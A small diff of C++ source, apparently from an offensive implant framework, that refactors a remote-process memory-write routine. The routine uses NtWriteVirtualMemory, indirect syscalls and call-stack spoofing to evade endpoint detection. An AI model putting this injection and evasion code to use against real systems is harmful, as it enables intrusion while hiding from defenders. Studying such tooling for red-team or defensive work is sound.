@@ -207,18 +207,18 @@ auto DECLFN Memory::WriteAPC(
 }
 
 auto DECLFN Memory::Write(
-    _In_ PVOID  Base,
-    _In_ BYTE*  Buffer,
-    _In_ ULONG  Size,
-    _In_ HANDLE Handle
+    _In_  PVOID   Base,
+    _In_  BYTE*   Buffer,
+    _In_  ULONG   Size,
+    _Out_ SIZE_T* Written,
+    _In_  HANDLE  Handle
 ) -> BOOL {
     const UINT32 Flags   = Self->KH_SYSCALL_FLAGS;
     NTSTATUS     Status  = STATUS_UNSUCCESSFUL;
-    SIZE_T       Written = 0;
 
     if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
         return NT_SUCCESS( Self->Ntdll.NtWriteVirtualMemory(
-            Handle, Base, Buffer, Size, &Written
+            Handle, Base, Buffer, Size, Written
         ));
     }
 
@@ -232,11 +232,11 @@ auto DECLFN Memory::Write(
 
 
     if ( Flags & SYSCALL_INDIRECT && ! (Flags & SYSCALL_SPOOF) ) {
-        SyscallExec( Sys::Write, Status, Handle, Base, Buffer, Size, &Written );
+        SyscallExec( Sys::Write, Status, Handle, Base, Buffer, Size, Written );
     } else {
         Status = Self->Spf->Call(
             Address, ssn, (UPTR)Handle, (UPTR)Base,
-            (UPTR)Buffer, (UPTR)Size, (UPTR)&Written
+            (UPTR)Buffer, (UPTR)Size, (UPTR)Written
         );
     }
     
